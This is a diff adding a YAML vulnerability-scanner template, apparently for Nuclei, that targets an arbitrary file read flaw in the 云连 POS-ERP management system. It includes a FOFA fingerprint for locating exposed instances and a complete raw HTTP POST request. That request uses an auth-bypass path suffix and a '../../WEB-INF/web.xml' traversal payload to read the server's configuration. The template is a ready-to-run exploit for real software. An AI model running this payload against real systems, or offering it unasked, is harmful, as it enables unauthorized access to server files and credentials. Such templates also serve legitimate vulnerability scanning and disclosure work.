@@ -1,0 +1,33 @@
+id: poc-xdob8z63akgk95bc
+info:
+  name: 云连POS-ERP管理系统 download.action存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xdob8z63akgk95bc'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xdob8z63akgk95bc
+    fofa: title="Powered By chaosZ"
+http:
+- raw:
+  - 'POST /admin/file!download.action;admin!login.action HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+    downloadFile=../../WEB-INF/web.xml'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
